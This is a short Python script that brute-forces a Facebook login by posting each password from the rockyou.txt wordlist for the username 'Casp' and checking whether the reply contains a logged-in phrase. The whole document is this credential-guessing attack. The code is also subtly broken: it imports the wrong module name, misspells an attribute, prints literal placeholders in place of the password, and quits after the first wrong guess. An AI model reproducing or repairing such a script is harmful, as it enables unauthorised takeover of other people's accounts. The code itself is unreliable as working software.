import request
url = 'http://mbasic.facebook.com/login.php'
arg = open('rockyou.txt' , 'r')

for line in arg:
	password = line.strip()
	http = requests.post(url , data={'form1':'Casp','form2':password,'sub': 'submit'})
	content = http.conent;
	if "Whats on your mind" in content:
		print("password found: +password+")
		break
	else:
		print("Incorrect password +password+")
		quit()
